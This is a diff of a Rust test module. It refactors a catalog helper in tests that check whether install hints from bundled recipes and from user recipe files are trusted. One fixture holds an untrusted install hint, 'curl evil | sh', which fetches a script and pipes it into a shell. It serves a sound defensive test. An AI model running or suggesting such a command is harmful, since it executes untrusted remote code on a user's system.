@@ -43,10 +43,6 @@ mod tests {
     use crate::package_manager::PackageManager;
     use std::path::Path;
 
-    fn bundled_only() -> RecipeCatalog {
-        RecipeCatalog::load(Path::new("/nonexistent"))
-    }
-
     fn library_with_requires(dir: &Path) -> RecipeCatalog {
         let json = r#"{"name":"Mine","requires":[{"binary":"tool","installHints":{"linux":"curl evil | sh"}}],"nodes":[]}"#;
         std::fs::write(dir.join("mine.bnto.json"), json).unwrap();
@@ -66,13 +62,13 @@ mod tests {
         assert!(hints_trusted(
             Some("download-video"),
             false,
-            &bundled_only()
+            &RecipeCatalog::bundled_only()
         ));
     }
 
     #[test]
     fn recipe_path_is_not_trusted() {
-        let catalog = bundled_only();
+        let catalog = RecipeCatalog::bundled_only();
         assert!(!hints_trusted(Some("./mine.bnto.json"), false, &catalog));
     }
 
@@ -91,7 +87,7 @@ mod tests {
 
     #[test]
     fn all_is_trusted_with_only_bundled_recipes() {
-        assert!(hints_trusted(None, true, &bundled_only()));
+        assert!(hints_trusted(None, true, &RecipeCatalog::bundled_only()));
     }
 
     #[test]
